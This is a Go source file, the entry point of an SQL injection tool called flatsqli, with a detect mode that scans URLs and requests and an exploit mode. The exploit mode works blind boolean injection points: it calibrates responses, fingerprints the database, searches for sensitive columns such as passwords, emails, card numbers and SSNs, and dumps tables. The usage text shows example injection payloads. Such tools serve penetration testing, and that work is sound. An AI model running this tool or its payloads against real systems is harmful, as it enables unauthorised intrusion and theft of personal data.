package main

import (
	"flag"
	"fmt"
	"os"
	"strings"

	"github.com/morkin1792/flatsqli/internal/calibrator"
	"github.com/morkin1792/flatsqli/internal/detector"
	"github.com/morkin1792/flatsqli/internal/extractor"
	"github.com/morkin1792/flatsqli/internal/finder"
	"github.com/morkin1792/flatsqli/internal/output"
	"github.com/morkin1792/flatsqli/internal/parser"
	"github.com/morkin1792/flatsqli/internal/requester"
	"github.com/morkin1792/flatsqli/internal/scanner"
	"github.com/morkin1792/flatsqli/internal/storage"
	"github.com/morkin1792/flatsqli/internal/ui"
)

var (
	version = "1.0.0"

	generalOptionsHelp = `General Options:
  -o, -output <file>       Output file path (markdown format)
  -H, -header <header>     Custom header (can be used multiple times)
  -proxy <url>             Proxy URL (e.g., http://127.0.0.1:8080)
  -timeout <seconds>       Request timeout in seconds (default: 10)
  -ph, -plain-http         Use plain HTTP instead of HTTPS
  -v, -verbose             Enable verbose output
`
)

// ExploitConfig holds exploit mode configuration
type ExploitConfig struct {
	RequestFile       string
	Verbose           bool
	Database          string
	Query             string
	Timeout           int
	Proxy             string
	MaxLen            int
	FindColumn        string
	FindImportantData bool
	FindTableLimit    int
	FindRowLimit      int
	OutputFile        string
	DumpTable         string
	UseHTTP           bool
	MatchString       string
	Headers           headerList
}

// headerList is a custom type to allow multiple -H flags
type headerList []string

func (h *headerList) String() string {
	return strings.Join(*h, ", ")
}

func (h *headerList) Set(value string) error {
	*h = append(*h, value)
	return nil
}

// DetectConfig holds detect mode configuration
type DetectConfig struct {
	URLsFile          string
	RequestsDirectory string
	Verbose           bool
	Timeout           int
	Proxy             string
	OutputFile        string
	UseHTTP           bool
	Headers           headerList
}

func main() {
	if len(os.Args) < 2 {
		printMainUsage()
		os.Exit(1)
	}

	switch os.Args[1] {
	case "exploit":
		runExploitMode()
	case "detect":
		runDetectMode()
	case "-h", "--help", "help":
		printMainUsage()
	case "-v", "--version", "version":
		fmt.Printf("flatsqli v%s\n", version)
	default:
		ui.Error("Unknown command: %s", os.Args[1])
		printMainUsage()
		os.Exit(1)
	}
}

func printMainUsage() {
	ui.Banner(version)
	fmt.Fprintf(os.Stderr, `Usage: flatsqli <command> [options]

Commands:
  exploit    Exploit a confirmed SQLi vulnerability to extract data
  detect     Detect potential SQLi vulnerabilities in URLs or requests

Run 'flatsqli <command> --help' for more information on a specific command.

%s
Examples:
  flatsqli exploit -rf req.txt -fid -o output.md
  flatsqli detect -uf urls.txt -o results.md
  flatsqli detect -rd requests/ -v

`, generalOptionsHelp)
}

func runExploitMode() {
	exploitCmd := flag.NewFlagSet("exploit", flag.ExitOnError)
	var config ExploitConfig

	// Exploit-specific flags
	exploitCmd.StringVar(&config.RequestFile, "rf", "", "")
	exploitCmd.StringVar(&config.RequestFile, "request-file", "", "Path to request file with injection marker")
	exploitCmd.StringVar(&config.Database, "db", "", "")
	exploitCmd.StringVar(&config.Database, "database", "", "Database type (mysql, mssql, oracle, postgres)")
	exploitCmd.StringVar(&config.Query, "q", "", "")
	exploitCmd.StringVar(&config.Query, "query", "", "Custom SQL query to extract")
	exploitCmd.IntVar(&config.MaxLen, "ml", 70, "")
	exploitCmd.IntVar(&config.MaxLen, "maxlen", 70, "Max chars to extract (0=no limit)")
	exploitCmd.StringVar(&config.FindColumn, "fc", "", "")
	exploitCmd.StringVar(&config.FindColumn, "find-column", "", "Search terms separated by comma (e.g. 'pass,user,email')")
	exploitCmd.BoolVar(&config.FindImportantData, "fid", false, "")
	exploitCmd.BoolVar(&config.FindImportantData, "find-important-data", false, "Find tables with sensitive columns")
	exploitCmd.IntVar(&config.FindTableLimit, "lt", 5, "")
	exploitCmd.IntVar(&config.FindTableLimit, "limit-tables", 5, "Max tables to search")
	exploitCmd.IntVar(&config.FindRowLimit, "lr", 3, "")
	exploitCmd.IntVar(&config.FindRowLimit, "limit-rows", 3, "Rows to extract per table")
	exploitCmd.StringVar(&config.DumpTable, "dt", "", "")
	exploitCmd.StringVar(&config.DumpTable, "dump-table", "", "Dump rows from a specific table")
	exploitCmd.StringVar(&config.MatchString, "cs", "", "")
	exploitCmd.StringVar(&config.MatchString, "calibration-string", "", "String to find in response for differentiation")

	// Shared flags
	exploitCmd.BoolVar(&config.Verbose, "v", false, "")
	exploitCmd.BoolVar(&config.Verbose, "verbose", false, "Enable verbose output")
	exploitCmd.StringVar(&config.Proxy, "proxy", "", "Proxy URL")
	exploitCmd.StringVar(&config.OutputFile, "o", "", "")
	exploitCmd.StringVar(&config.OutputFile, "output", "", "Output file path")
	exploitCmd.IntVar(&config.Timeout, "timeout", 10, "Request timeout in seconds")
	exploitCmd.BoolVar(&config.UseHTTP, "ph", false, "")
	exploitCmd.BoolVar(&config.UseHTTP, "plain-http", false, "Use plain HTTP instead of HTTPS")
	exploitCmd.Var(&config.Headers, "H", "Custom header (can be used multiple times)")
	exploitCmd.Var(&config.Headers, "header", "Custom header (can be used multiple times)")

	exploitCmd.Usage = func() {
		ui.Banner(version)
		fmt.Fprintf(os.Stderr, `Usage: flatsqli exploit -rf <request-file> [options]

The request file MUST contain an injection marker. The marker should be placed
where the boolean result changes the server response (i.e. CASE WHEN or IF).

Example requests with marker:
  GET /product?q='+(SELECT+CASE+WHEN+(<INJECT>)+THEN+'apple'+ELSE+'banana'+END)+' HTTP/1.1
  Host: target

  GET /users/?id=apple'AND+IF(<INJECT>,true,false)+AND'z'='z&Submit=Submit HTTP/1.1
  Host: vulnerable

Different responses MUST be triggered when the conditions are true and false.
Acceptable markers (same function): <PAYLOAD>, <FUZZ>, <INJECT>

Exploit Options:
  -rf, -request-file <file>      Path to request file with injection marker
  -cs, -calibration-string <str> String to indicate TRUE/FALSE differentiation
  -fid, -find-important-data     Find tables with sensitive columns
  -fc, -find-column <terms>      Search terms separated by comma (e.g. 'credit_card,ssn')
  -dt, -dump-table <table>       Dump rows from a specific table
  -lt, -limit-tables <n>         Max tables to search (default: 5)
  -lr, -limit-rows <n>           Rows to extract per table (default: 3)
  -db, -database <type>          Database type (mysql, mssql, oracle, postgres)
  -q, -query <sql>               Custom SQL query to extract
  -ml, -maxlen <n>               Max chars to extract (default: 70, 0=no limit)

%s
Examples:
  flatsqli exploit -rf req.txt -fid -o output.md
  flatsqli exploit -rf req.txt -dt USERS -lr 10 -o dump.md
  flatsqli exploit -rf req.txt -q "SELECT user()" -db mysql

`, generalOptionsHelp)
	}

	exploitCmd.Parse(os.Args[2:])

	if config.RequestFile == "" {
		ui.Error("Request file is required. Use -rf <file>")
		exploitCmd.Usage()
		os.Exit(1)
	}

	runExploit(config)
}

func runDetectMode() {
	detectCmd := flag.NewFlagSet("detect", flag.ExitOnError)
	var config DetectConfig

	// Detect-specific flags
	detectCmd.StringVar(&config.URLsFile, "uf", "", "")
	detectCmd.StringVar(&config.URLsFile, "urls-file", "", "File containing URLs with parameters")
	detectCmd.StringVar(&config.RequestsDirectory, "rd", "", "")
	detectCmd.StringVar(&config.RequestsDirectory, "requests-directory", "", "Directory with raw request files")

	// Shared flags
	detectCmd.BoolVar(&config.Verbose, "v", false, "")
	detectCmd.BoolVar(&config.Verbose, "verbose", false, "Enable verbose output")
	detectCmd.StringVar(&config.Proxy, "proxy", "", "Proxy URL")
	detectCmd.StringVar(&config.OutputFile, "o", "", "")
	detectCmd.StringVar(&config.OutputFile, "output", "", "Output file path")
	detectCmd.IntVar(&config.Timeout, "timeout", 10, "Request timeout in seconds")
	detectCmd.BoolVar(&config.UseHTTP, "ph", false, "")
	detectCmd.BoolVar(&config.UseHTTP, "plain-http", false, "Use plain HTTP instead of HTTPS")
	detectCmd.Var(&config.Headers, "H", "Custom header (can be used multiple times)")
	detectCmd.Var(&config.Headers, "header", "Custom header (can be used multiple times)")

	detectCmd.Usage = func() {
		ui.Banner(version)
		fmt.Fprintf(os.Stderr, `Usage: flatsqli detect <input> [options]

Input (choose one):
  -uf, -urls-file <file>         File containing URLs with parameters (one per line)
  -rd, -requests-directory <dir> Directory with raw request files (without markers)

%s
Output Format:
  When using -uf, vulnerable URLs are saved in a code block:
    `+"```"+`
    https://example.com/xpto?a=1&q=<PAYLOAD>&c=...
    `+"```"+`

  When using -rd, each vulnerable request is saved separately:
    `+"```http"+`
    GET /path?id=<PAYLOAD> HTTP/1.1
    Host: example.com
    `+"```"+`

Examples:
  flatsqli detect -uf urls.txt -o output.md
  flatsqli detect -rd requests/ -o output.md -v

`, generalOptionsHelp)
	}

	detectCmd.Parse(os.Args[2:])

	if config.URLsFile == "" && config.RequestsDirectory == "" {
		ui.Error("Input is required. Use -uf <file> or -rd <directory>")
		detectCmd.Usage()
		os.Exit(1)
	}

	if config.URLsFile != "" && config.RequestsDirectory != "" {
		ui.Error("Cannot use both -uf and -rd. Choose one input method.")
		os.Exit(1)
	}

	runDetect(config)
}

func runExploit(config ExploitConfig) {
	// Parse the request file
	ui.Info("Parsing request file: %s", config.RequestFile)
	req, err := parser.ParseRequestFile(config.RequestFile)
	if err != nil {
		ui.Error("Failed to parse request file: %v", err)
		os.Exit(1)
	}

	// Check for marker
	if req.MarkerPosition == -1 {
		ui.Error("No injection marker found in request file!")
		ui.Info("Add a marker (<PAYLOAD>, <FUZZ>, or <INJECT>) where the boolean condition should be injected.")
		ui.Info("Example: id=1'+CASE+WHEN+(<PAYLOAD>)+THEN+1+ELSE+2+END--")
		os.Exit(1)
	}

	// Override scheme if --http flag is set
	if config.UseHTTP {
		req.Scheme = "http"
	}

	ui.Verbose(config.Verbose, "Target: %s://%s%s", req.Scheme, req.Host, req.Path)
	ui.Verbose(config.Verbose, "Marker found at position %d", req.MarkerPosition)

	// Create requester
	httpRequester, err := requester.New(req, config.Timeout, config.Proxy, config.Verbose)
	if err != nil {
		ui.Error("Failed to create requester: %v", err)
		os.Exit(1)
	}

	// Set match string if provided
	if config.MatchString != "" {
		httpRequester.SetMatchString(config.MatchString)
		ui.Verbose(config.Verbose, "Using match string: %s", config.MatchString)
	}

	// Set custom headers if provided
	if len(config.Headers) > 0 {
		httpRequester.SetHeaders(config.Headers)
		ui.Verbose(config.Verbose, "Using %d custom header(s)", len(config.Headers))
	}

	// Calibration phase
	ui.Progress("Starting calibration...")
	cal := calibrator.New(httpRequester, config.Verbose)
	result, err := cal.Calibrate()
	if err != nil {
		ui.ProgressDone()
		ui.Error("Calibration failed: %v", err)
		os.Exit(1)
	}

	if !result.CanDifferentiate {
		ui.ProgressDone()
		ui.Error("Cannot differentiate TRUE from FALSE responses!")
		ui.Error("TRUE response:  [Status: %d, Words: %d, Length: %d]",
			result.TrueFingerprint.StatusCode,
			result.TrueFingerprint.WordCount,
			result.TrueFingerprint.ContentLength)
		ui.Error("FALSE response: [Status: %d, Words: %d, Length: %d]",
			result.FalseFingerprint.StatusCode,
			result.FalseFingerprint.WordCount,
			result.FalseFingerprint.ContentLength)

		if config.MatchString == "" && (result.TrueFingerprint.WordCount != result.FalseFingerprint.WordCount || result.TrueFingerprint.ContentLength != result.FalseFingerprint.ContentLength) {
			ui.Warning("Suggestion: Use the -calibration-string parameter to indicate TRUE/FALSE differentiation.")
		}
		os.Exit(1)
	}

	// Overwrite the "Starting calibration..." line
	fmt.Fprintf(os.Stderr, "\r\033[K")
	ui.Success("Calibration successful!")
	ui.Verbose(config.Verbose, "TRUE:  [Status: %d, Words: %d]", result.TrueFingerprint.StatusCode, result.TrueFingerprint.WordCount)
	ui.Verbose(config.Verbose, "FALSE: [Status: %d, Words: %d]", result.FalseFingerprint.StatusCode, result.FalseFingerprint.WordCount)
	ui.Verbose(config.Verbose, "ERROR: [Status: %d, Words: %d]", result.ErrorFingerprint.StatusCode, result.ErrorFingerprint.WordCount)

	// Database detection
	var dbType detector.DatabaseType
	var detectedVersion string
	var dbSource string

	// Check if database was specified by user
	if config.Database != "" {
		dbType = detector.ParseDatabaseType(config.Database)
		if dbType == detector.Unknown {
			ui.Error("Unknown database type: %s. Supported: mysql, mssql, oracle, postgres", config.Database)
			os.Exit(1)
		}
		dbSource = "parameter"
	} else {
		// Try to load from cache
		cached, cachedVersion := storage.LoadDatabase(req.Host)
		if cached != "" {
			dbType = detector.ParseDatabaseType(cached)
			detectedVersion = cachedVersion
			dbSource = "cache"
		}
	}

	// If still unknown, detect
	if dbType == detector.Unknown {
		ui.Progress("Detecting database...")
		det := detector.New(httpRequester, result, config.Verbose)
		dbType, detectedVersion, err = det.Detect()
		if err != nil {
			ui.ProgressDone()
			ui.Error("Database detection failed: %v", err)
			os.Exit(1)
		}
		ui.ProgressDone()
		dbSource = "detected"

		// Save to cache
		if err := storage.SaveDatabase(req.Host, dbType.String(), detectedVersion); err != nil {
			ui.Verbose(config.Verbose, "Warning: Could not save database cache: %v", err)
		}
	}

	// Print consolidated database info
	if detectedVersion != "" {
		ui.Info("Database: %s (%s)", detectedVersion, dbSource)
	} else {
		ui.Info("Database: %s (%s)", dbType.String(), dbSource)
	}

	// Print target info for reports/screenshots
	ui.Info("Target: %s %s://%s%s", req.Method, req.Scheme, req.Host, req.Path)

	// Check if dump table mode is requested
	if config.DumpTable != "" {
		f := finder.New(httpRequester, result, dbType, config.Verbose, req.Host)
		if config.MaxLen > 0 {
			f.SetMaxLen(config.MaxLen)
		}

		if err := f.DumpTable(config.DumpTable, config.FindRowLimit, config.OutputFile); err != nil {
			ui.Error("Dump failed: %v", err)
			os.Exit(1)
		}
		ui.Success("Done!")
		return
	}

	// Check if finder mode is requested
	if config.FindColumn != "" || config.FindImportantData {
		pattern := config.FindColumn
		tableLimit := config.FindTableLimit

		if config.FindImportantData {
			pattern = finder.ImportantDataPattern
			if config.FindTableLimit == 5 { // Default wasn't overridden
				tableLimit = 10
			}
		}

		f := finder.New(httpRequester, result, dbType, config.Verbose, req.Host)
		if config.MaxLen > 0 {
			f.SetMaxLen(config.MaxLen)
		}

		if err := f.Run(pattern, tableLimit, config.FindRowLimit, true, config.OutputFile); err != nil {
			ui.Error("Finder failed: %v", err)
			os.Exit(1)
		}
		ui.Success("Done!")
		return
	}

	// Data extraction
	ext := extractor.New(httpRequester, result, dbType, config.Verbose)
	if config.MaxLen > 0 {
		ext.SetMaxLen(config.MaxLen)
	} else if config.MaxLen == 0 {
		ext.SetMaxLen(0) // No limit
	}

	// If custom query specified, extract it
	if config.Query != "" {
		ui.Info("Extracting custom query: %s", config.Query)
		data, err := ext.ExtractQuery(config.Query)
		if err != nil {
			ui.Error("Extraction failed: %v", err)
			os.Exit(1)
		}
		ui.Success("Result: %s", data)
	} else {
		// Default: extract version if not already done
		if detectedVersion == "" {
			ui.Info("Extracting database version...")
			detectedVersion, err = ext.ExtractVersion()
			if err != nil {
				ui.Error("Version extraction failed: %v", err)
				os.Exit(1)
			}
			ui.Success("Version: %s", detectedVersion)
		}
	}

	ui.Success("Done!")
}

func runDetect(config DetectConfig) {
	isURLInput := config.URLsFile != ""

	// Create output writer
	writer, err := output.New(config.OutputFile, isURLInput)
	if err != nil {
		ui.Error("Failed to create output file: %v", err)
		os.Exit(1)
	}
	defer writer.Close()

	// Write custom headers to output if any
	if len(config.Headers) > 0 {
		writer.WriteHeaders(config.Headers)
	}

	if isURLInput {
		runDetectURLs(config, writer)
	} else {
		runDetectRequests(config, writer)
	}
}

func runDetectURLs(config DetectConfig, writer *output.Writer) {
	ui.Info("Loading URLs from: %s", config.URLsFile)

	urls, err := parser.ParseURLFile(config.URLsFile)
	if err != nil {
		ui.Error("Failed to parse URL file: %v", err)
		os.Exit(1)
	}

	ui.Info("Loaded %d URLs", len(urls))

	vulnCount := 0
	var vulnList []string
	for i, rawURL := range urls {
		ui.Progress("Scanning URL %d/%d...", i+1, len(urls))

		// Convert URL to request
		req, err := parser.URLToRequest(rawURL)
		if err != nil {
			ui.Verbose(config.Verbose, "Skipping invalid URL: %s (%v)", rawURL, err)
			continue
		}

		// Override scheme if --http flag is set
		if config.UseHTTP {
			req.Scheme = "http"
		}

		// Check if URL has parameters
		if !strings.Contains(req.Path, "?") {
			ui.Verbose(config.Verbose, "Skipping URL without parameters: %s", rawURL)
			continue
		}

		// Create requester
		httpRequester, err := requester.New(req, config.Timeout, config.Proxy, config.Verbose)
		if err != nil {
			ui.Verbose(config.Verbose, "Failed to create requester for %s: %v", rawURL, err)
			continue
		}

		// Set custom headers if provided
		if len(config.Headers) > 0 {
			httpRequester.SetHeaders(config.Headers)
		}

		// Create scanner and scan
		scan := scanner.New(req, httpRequester, config.Verbose)
		results := scan.ScanAll()

		// Check for vulnerabilities
		for _, r := range results {
			if r.IsVulnerable {
				vulnCount++
				// Build URL with <PAYLOAD> marker
				markedURL := buildMarkedURL(rawURL, r.Parameter.Name)
				writer.WriteURLResult(markedURL, r.Parameter.Name)
				// Store for printing
				vulnList = append(vulnList, fmt.Sprintf("%s://%s%s (param: %s)", req.Scheme, req.Host, req.Path, r.Parameter.Name))
				ui.Verbose(config.Verbose, "Found potential SQLi: %s (param: %s)", rawURL, r.Parameter.Name)
			}
		}
	}

	ui.ProgressDone()

	if vulnCount > 0 {
		ui.Success("Scan complete. Found %d potential injection point(s).", vulnCount)
		for _, v := range vulnList {
			ui.Info("  %s", v)
		}
		if config.OutputFile != "" {
			ui.Info("Results saved to: %s", config.OutputFile)
		}
	} else {
		ui.Info("Scan complete. No SQL injection vulnerabilities detected.")
	}
}

func runDetectRequests(config DetectConfig, writer *output.Writer) {
	ui.Info("Loading requests from: %s", config.RequestsDirectory)

	requests, err := parser.ParseRequestsDirectory(config.RequestsDirectory)
	if err != nil {
		ui.Error("Failed to parse requests directory: %v", err)
		os.Exit(1)
	}

	ui.Info("Loaded %d request files", len(requests))

	vulnCount := 0
	var vulnList []string
	for i, req := range requests {
		ui.Progress("Scanning request %d/%d...", i+1, len(requests))

		// Override scheme if --http flag is set
		if config.UseHTTP {
			req.Scheme = "http"
		}

		// Create requester
		httpRequester, err := requester.New(req, config.Timeout, config.Proxy, config.Verbose)
		if err != nil {
			ui.Verbose(config.Verbose, "Failed to create requester: %v", err)
			continue
		}

		// Set custom headers if provided
		if len(config.Headers) > 0 {
			httpRequester.SetHeaders(config.Headers)
		}

		// Create scanner and scan
		scan := scanner.New(req, httpRequester, config.Verbose)
		results := scan.ScanAll()

		// Check for vulnerabilities
		for _, r := range results {
			if r.IsVulnerable {
				vulnCount++
				// Build request with <PAYLOAD> marker
				markedRequest := buildMarkedRequest(req.RawRequest, r.Parameter)
				// Apply custom headers to the output request
				markedRequest = applyHeadersToRequest(markedRequest, config.Headers)
				writer.WriteRequestResult(markedRequest, r.Parameter.Name)
				// Store for printing
				vulnList = append(vulnList, fmt.Sprintf("%s://%s%s (param: %s)", req.Scheme, req.Host, req.Path, r.Parameter.Name))
				ui.Verbose(config.Verbose, "Found potential SQLi in param: %s", r.Parameter.Name)
			}
		}
	}

	ui.ProgressDone()

	if vulnCount > 0 {
		ui.Success("Scan complete. Found %d potential injection point(s).", vulnCount)
		for _, v := range vulnList {
			ui.Info("  %s", v)
		}
		if config.OutputFile != "" {
			ui.Info("Results saved to: %s", config.OutputFile)
		}
	} else {
		ui.Info("Scan complete. No SQL injection vulnerabilities detected.")
	}
}

// buildMarkedURL replaces the vulnerable parameter value with <PAYLOAD>
func buildMarkedURL(rawURL, paramName string) string {
	// Parse the URL to find and replace the parameter value
	parts := strings.SplitN(rawURL, "?", 2)
	if len(parts) != 2 {
		return rawURL
	}

	base := parts[0]
	query := parts[1]

	params := strings.Split(query, "&")
	for i, p := range params {
		kv := strings.SplitN(p, "=", 2)
		if len(kv) == 2 && kv[0] == paramName {
			params[i] = paramName + "=<PAYLOAD>"
		}
	}

	return base + "?" + strings.Join(params, "&")
}

// buildMarkedRequest replaces the vulnerable parameter value with <PAYLOAD>
func buildMarkedRequest(rawRequest string, param scanner.Parameter) string {
	// For URL params, replace in the path
	if param.Location == "url" {
		return strings.Replace(rawRequest, param.Name+"="+param.Value, param.Name+"=<PAYLOAD>", 1)
	}

	// For body params, replace in the body section
	if param.Location == "body" || param.Location == "json" {
		return strings.Replace(rawRequest, param.Name+"="+param.Value, param.Name+"=<PAYLOAD>", 1)
	}

	return rawRequest
}

// applyHeadersToRequest applies custom headers to a raw request string
func applyHeadersToRequest(rawRequest string, headers []string) string {
	if len(headers) == 0 {
		return rawRequest
	}

	lines := strings.Split(rawRequest, "\n")
	if len(lines) < 2 {
		return rawRequest
	}

	// Parse custom headers into map
	customHeaders := make(map[string]string)
	for _, h := range headers {
		parts := strings.SplitN(h, ":", 2)
		if len(parts) == 2 {
			customHeaders[strings.ToLower(strings.TrimSpace(parts[0]))] = strings.TrimSpace(parts[1])
		}
	}

	// Find where headers end (empty line)
	headerEnd := len(lines)
	for i, line := range lines {
		if strings.TrimSpace(line) == "" {
			headerEnd = i
			break
		}
	}

	// Build new request with custom headers applied
	var result []string
	result = append(result, lines[0]) // Keep request line

	seenHeaders := make(map[string]bool)
	for i := 1; i < headerEnd; i++ {
		colonIdx := strings.Index(lines[i], ":")
		if colonIdx > 0 {
			headerName := strings.ToLower(strings.TrimSpace(lines[i][:colonIdx]))
			if val, exists := customHeaders[headerName]; exists {
				// Replace with custom header value
				result = append(result, lines[i][:colonIdx]+": "+val)
				seenHeaders[headerName] = true
				continue
			}
		}
		result = append(result, lines[i])
	}

	// Add any custom headers that weren't already present
	for _, h := range headers {
		parts := strings.SplitN(h, ":", 2)
		if len(parts) == 2 {
			headerName := strings.ToLower(strings.TrimSpace(parts[0]))
			if !seenHeaders[headerName] {
				result = append(result, h)
			}
		}
	}

	// Add remaining lines (empty line + body)
	result = append(result, lines[headerEnd:]...)

	return strings.Join(result, "\n")
}
